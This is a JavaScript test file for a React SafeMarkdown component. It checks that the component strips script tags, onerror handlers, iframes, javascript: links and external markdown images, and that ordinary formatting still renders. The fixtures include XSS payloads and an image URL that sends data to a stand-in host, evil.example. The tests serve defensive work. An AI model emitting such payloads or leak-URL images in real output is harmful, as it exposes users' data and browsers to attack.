import { render } from "@testing-library/react";
import SafeMarkdown from "../SafeMarkdown";

const html = (md) => render(<SafeMarkdown>{md}</SafeMarkdown>).container;

describe("SafeMarkdown never renders anything dangerous", () => {
  test("raw HTML (script, img onerror, iframe) is not rendered", () => {
    const c = html('Hello <script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>');
    expect(c.querySelector("script")).toBeNull();
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("iframe")).toBeNull();
    expect(c.innerHTML).not.toMatch(/onerror/i);
  });

  test("markdown images are never loaded (data-leak channel)", () => {
    const c = html("![secret](https://evil.example/leak?d=abc)");
    expect(c.querySelector("img")).toBeNull();
    expect(c.innerHTML).not.toContain("evil.example");
    expect(c.textContent).toContain("[image: secret]");
  });

  test("links are plain text: no anchors, no javascript: URLs", () => {
    const c = html("[click me](javascript:alert(1)) and [docs](https://example.com)");
    expect(c.querySelector("a")).toBeNull();
    expect(c.innerHTML).not.toMatch(/javascript:|href=/i);
    expect(c.textContent).toContain("click me");
  });
});

describe("SafeMarkdown renders normal formatting", () => {
  test("headings, lists, inline code, code block, table", () => {
    const c = html("## Title\n\n- one\n- two\n\n1. first\n\nUse `print()` here\n\n```python\nprint('hi')\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |");
    expect(c.querySelector("h3")?.textContent).toBe("Title");
    expect(c.querySelectorAll("ul li").length).toBe(2);
    expect(c.querySelector("ol li")?.textContent).toBe("first");
    expect(c.querySelector("pre code")?.textContent).toContain("print('hi')");
    expect(c.querySelector("table th")?.textContent).toBe("a");
    expect([...c.querySelectorAll("code")].some((n) => n.textContent === "print()")).toBe(true);
  });

  test("handles empty / non-string input", () => {
    expect(() => html(undefined)).not.toThrow();
    expect(() => html(null)).not.toThrow();
  });
});
